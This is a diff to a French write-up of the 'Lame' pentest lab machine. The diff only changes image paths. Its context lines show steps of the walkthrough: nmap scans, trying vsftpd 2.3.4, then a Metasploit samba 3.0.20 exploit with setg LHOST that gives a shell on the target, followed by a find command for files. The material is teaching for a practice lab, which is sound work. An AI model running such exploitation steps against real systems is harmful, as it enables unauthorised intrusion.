@@ -28,7 +28,7 @@ nmap
     * 
 
 ###### résultat du premier scan
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-01.png)
+!["Étapes d'un pentest"](Machine-Lame-01.png)
 
 ###### résultats du deuxième scan
 
@@ -52,7 +52,7 @@ msfconsole
 ###### Exploitation de la vulnérabilité
 
 ##### vulnérabilité 1 : vsftpd 2.3.4
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-6.png)
+!["Étapes d'un pentest"](Machine-Lame-6.png)
 
 Étant donné que le premier ne marche pas, on va essayer de chercher d'autres vulnérabilités : essayons l'os découvert grâce au scan nmap : **samba 3.0.20** 
 ##### vulnérabilité 2 : samba 3.0.20
@@ -64,10 +64,10 @@ msfconsole
  setg LHOST <Mon addresse IP>
  exploit
 ```
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-04.png)
+!["Étapes d'un pentest"](Machine-Lame-04.png)
 
 
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-05.png)
+!["Étapes d'un pentest"](Machine-Lame-05.png)
 Nous avons donc accès à la console de la cible
 ###### Recherche des fichier avec 
 ```bash
@@ -75,7 +75,7 @@ Nous avons donc accès à la console de la cible
 find / -name "nom_du_fichier" 2>/dev/null
 ```
 
-!["Étapes d'un pentest"](../../Ressources/IMG/Machine-Lame-07.png)
+!["Étapes d'un pentest"](Machine-Lame-07.png)
 
 ### Ce que j'ai Appris :
 
